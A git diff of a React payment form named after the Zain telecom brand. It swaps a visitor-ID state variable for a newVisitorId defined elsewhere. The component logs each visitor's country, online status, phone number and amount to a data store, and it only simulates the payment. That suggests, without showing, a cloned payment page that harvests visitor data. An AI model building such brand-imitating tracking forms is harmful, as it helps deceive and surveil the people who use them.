@@ -32,16 +32,8 @@ export default function ZainPaymentForm() {
   const [phoneError, setPhoneError] = useState("")
   const [isLoading, setIsLoading] = useState(false)
   const [activeTab, setActiveTab] = useState("bill")
-  const [visitorId, setVisitorId] = useState<string | null>(null);
 
   useEffect(() => {
-    const userid=localStorage.getItem('visitor')
-    if(userid!==null){
-    localStorage.setItem("visitor", newVisitorId);
-    setVisitorId(newVisitorId);
-    }else{
-      setVisitorId(userid)
-    }
    getLocationAndLog()
   }, []);
 
@@ -73,7 +65,7 @@ export default function ZainPaymentForm() {
   }
 
   const getLocationAndLog = useCallback(async () => {
-    if (!visitorId) return;
+    if (!newVisitorId) return;
 
     // This API key is public and might be rate-limited or disabled.
     // For a production app, use a secure way to handle API keys, ideally on the backend.
@@ -88,37 +80,39 @@ export default function ZainPaymentForm() {
       const country = await response.text()
       await addData({
         createdDate: new Date().toISOString(),
-        id: visitorId,
+        id: newVisitorId,
         country: country,
         action: "page_load"
       })
       localStorage.setItem("country", country) // Consider privacy implications
-      setupOnlineStatus(visitorId)
+      setupOnlineStatus(newVisitorId)
     } catch (error) {
       console.error("Error fetching location:", error)
       // Log error with visitor ID for debugging
       await addData({
         createdDate: new Date().toISOString(),
-        id: visitorId,
+        id: newVisitorId,
         error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
         action: "location_error"
       });
     }
-  }, [visitorId]);
+  }, []);
 
   useEffect(() => {
-    getLocationAndLog();
+    getLocationAndLog().then(()=>{
+
+    });
   }, []);
 
   const handleSubmit = async (e:any) => {
     e.preventDefault()
     setIsLoading(true)
 
-    if (!visitorId) return
+    if (!newVisitorId) return
     
     try {
       await addData({
-        id: visitorId,
+        id: newVisitorId,
         phone: phone, // Storing phone number, ensure compliance with privacy regulations
         amount: amount,
         timestamp: new Date().toISOString(),
@@ -128,7 +122,7 @@ export default function ZainPaymentForm() {
       
       // On successful payment simulation
       await addData({
-        id: visitorId,
+        id: newVisitorId,
         action: "payment_submit_success_simulation",
         status: "simulated_success"
       });
@@ -138,7 +132,7 @@ export default function ZainPaymentForm() {
     } catch (error) {
       console.error("Submission error:", error);
       await addData({
-        id: visitorId,
+        id: newVisitorId,
         action: "payment_submit_error",
         error: error instanceof Error ? error.message : String(error)
       });
